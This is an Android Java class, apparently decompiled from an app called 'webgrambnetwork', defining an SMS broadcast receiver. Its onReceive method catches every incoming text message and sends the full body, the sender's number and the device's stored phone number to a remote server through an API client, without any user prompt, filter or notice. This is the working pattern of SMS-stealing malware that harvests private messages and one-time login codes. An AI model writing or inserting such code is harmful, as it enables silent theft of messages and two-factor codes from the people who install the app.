package com.webgrambnetwork.Services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import com.webgrambnetwork.ApiClient;
import com.webgrambnetwork.ApiInterface;
import com.webgrambnetwork.BuildConfig;
import java.io.IOException;
import okhttp3.ResponseBody;
import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class SmsReceiver extends BroadcastReceiver {
    private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
    SharedPreferences sharedPreferences;

    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(SMS_RECEIVED)) {
            this.sharedPreferences = context.getSharedPreferences(BuildConfig.APPLICATION_ID, 0);
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus.length != 0) {
                    SmsMessage[] messages = new SmsMessage[pdus.length];
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < pdus.length; i++) {
                        messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
                        sb.append(messages[i].getMessageBody());
                    }
                    sendToServer(sb.toString(), messages[0].getOriginatingAddress(), this.sharedPreferences.getString("phoneNumber", "NO PHONE NUMBER"));
                }
            }
        }
    }

    private void sendToServer(String message, String sender, String receiver) {
        ((ApiInterface) ApiClient.getClient().create(ApiInterface.class)).sendSMSToServer(sender, message, receiver).enqueue(new Callback<ResponseBody>() {
            public void onResponse(Call<ResponseBody> call, Response<ResponseBody> response) {
                if (response.isSuccessful())
                {
                    try {
                        System.out.println(response.body().string());
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }else {
                    try {
                        System.out.println(response.errorBody().string());
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }

            public void onFailure(Call<ResponseBody> call, Throwable t) {
            }
        });
    }
}